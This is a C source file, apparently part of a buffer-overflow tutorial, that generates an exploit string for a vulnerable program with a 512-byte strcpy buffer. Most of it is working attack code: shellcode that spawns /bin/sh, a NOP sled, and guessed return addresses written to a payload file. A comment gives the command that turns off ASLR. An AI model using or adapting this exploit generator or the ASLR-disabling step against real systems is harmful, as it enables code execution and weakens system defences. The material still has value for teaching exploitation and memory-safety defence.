//
// generator1.c
//
// Tool to craft the exploitation string.
// It accepts two parameters:
//     string_length - the total length in bytes of the string that will be
//         later copied to the stack buffer of the vulnerable program. This
//         length must be greater than the buffer size, to which strcpy
//         function performs a copy.
//     offset_in_the_stack - the offset in bytes from the current process's
//         stack pointer a.k.a. top of the stack. This must be chosen
//         randomly and passed to generator1 program.
// Notes:
//  The crafted exploitation string will be sent to vulnerable program by
// some other means, for instance, manually or with a bash script. It will
// eventually crash the vulnerable process. If this happens, the exit code of
// the process will not be 0 == Success. So, a new exploitation string must be
// generated, containing decreased by 4 bytes offset in the stack (if the
// stack grows downwards in the memory, like it is presented below). This must
// be repeated until the exploitation will actually work. The return address
// from the function, containing overflowed buffer will point to the beginning
// of this buffer, with our shellcode in it.
// This is done with two assumptions:
//   1. stack region is always layed out by the kernel at the same address for
// each new program. And after program restart, the vulnerable buffer will be
// placed exactly at the same memory location as it was before. This was
// common before ASLR was implemented. Nowadays, to turn it off, we need:
//       # echo "0" > /proc/sys/kernel/randomize_va_space
//   2. our generator1 program's top of the stack is higher in memory than the
// vulnerable program's buffer of interest. Below is the possible layout of
// stacks in both programs:
//
// generator1!main:
// bottom of                                                            top of
// memory                                                               memory
//            offs  bsiz  addr  buff  long  sfp   ret   argc  argv
// <------   [    ][    ][    ][    ][    ][    ][    ][    ][    ]
//           ^                             ^                                 ^
//          esp                           ebp                       0xffffe000
//
// top of                                                            bottom of
// stack                                                                 stack
//
//
//
// vulnerable1!vuln:
// bottom of                                                            top of
// memory                                                               memory
//            buffer,512 bytes  sfpv  retv  sfpm  retm  argc  argv
// <------   [                ][    ][    ][    ][    ][    ][    ]
//           ^                 ^                                             ^
//          esp               ebp                                   0xffffe000
//
// top of                                                            bottom of
// stack                                                                 stack
//
// Where:
//     the amount of spaces reflects the actual amount of bytes, except buffer
//     retm - address to which the processor will transfer its execution after
//            leaving the function main
//     retv - saved return address from function vulnerable.c!vuln()
//     sfpm - Stored Frame Pointer or EBP of the previous function, that
//           called main()
//     sfpv - saved stack frame pointer of function main(), that called vuln()
//
// Note, that esp in the second case will be further from the bottom of the
// stack 0xffffe000, than it is in the first case. So, subtracting 4 bytes
// each time from our esp, we will eventually generate a string that exploit
// vulnerable buffer.
//

#include <stdlib.h>
#include <stdio.h>
#include <string.h>

const int DEFAULT_OFFSET = 0;
const int DEFAULT_BUFFER_SIZE = 512;

// This shellcode is taken from Steps 3 and 4 and it performs exec(/bin/sh)
char shellcode[] = {
    "\xeb\x1f\x5e\x31\xc0\x88\x46\x07\x89\x76\x08\x89\x46\x0c\xb0\x0b"
    "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
    "\x80\xe8\xdc\xff\xff\xff"
    "/bin/sh" // Note the terminating zero, and use strlen() or sizeof() - 1
              // to obtain shellcode's length!
};

unsigned long get_sp() {
    __asm__("movl %esp, %eax \n\t");
}

void main(int argc, char* argv[]) {
    if (argc > 1 && !strcmp(argv[1], "-h")) {
        printf("Usage:\n      %s <string_length> <offset_in_the_stack>"
            " <output_file>\n", argv[0]);
        exit(1);
    }

    int offset = DEFAULT_OFFSET, bsize = DEFAULT_BUFFER_SIZE;
    char* payload_name = "payload1.txt";
    if (argc > 1)
        bsize = atoi(argv[1]);
    if (argc > 2)
        offset = atoi(argv[2]);
    if (argc > 3)
        payload_name = argv[3];
    if (bsize < DEFAULT_BUFFER_SIZE || offset < DEFAULT_OFFSET)
        exit(1);

    // Calculate return address candidate in vulnerable.c program
    long address = get_sp() - offset;
    printf("Trying address: 0x%08x...\n", address);

    // Prepare the buffer for shellcode + ret addresses
    char* buffer = malloc(bsize);
    if (!buffer) {
        printf("Can't allocate memory, malloc(%d)\n", bsize);
        exit(1);
    }

    // Note that this will work only with the assumption that addresses on the
    // stack do not contain null bytes, e.g. 0xbffffdb4.
    // If the stack is located lower in memory, like in Windows, e.g. 0x00fcdda,
    // then strcpy will stop copying on the first null byte.

    // [NOP.NOP.NOP.NOP.RET.RET.RET.RET.....RET.]
    long* long_ptr = (long*)buffer;
    for (int i = 0; i < bsize / sizeof(long*); ++i) {
        if (i < bsize / sizeof(long*) / 2)
            *(long_ptr++) = 0x90909090; // 4 nop instructions
        else
            *(long_ptr++) = address;
    }

    // [NOP.NOP.NOP.NOP.SHELLCODE.T.RET.....RET.]
    memcpy(buffer + bsize / 2, shellcode, strlen(shellcode));

    // Dump the exploitation string to the file
    FILE* f = fopen(payload_name, "w");
    if (f) {
        fwrite(buffer, 1, bsize, f);
        fclose(f);
    }
}

